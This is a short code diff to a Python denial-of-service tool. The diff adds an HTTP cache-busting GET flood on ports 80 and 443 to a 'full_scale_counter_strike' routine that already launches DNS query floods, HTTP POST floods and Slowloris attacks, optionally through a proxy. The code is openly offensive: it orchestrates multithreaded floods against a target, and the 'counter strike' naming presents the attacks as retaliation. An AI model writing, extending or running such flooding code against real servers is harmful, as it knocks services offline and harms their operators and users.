@@ -54,6 +54,10 @@ def full_scale_counter_strike(target, use_proxy, network_interface):
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
     if use_proxy: print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")
 
+    # NEW: HTTP Cache-Busting GET Flood (Proxy-aware)
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
+        attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_cache_bust, args))
     # HTTP POST (Proxy-aware)
     for port in [80, 443, 8080]:
         args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
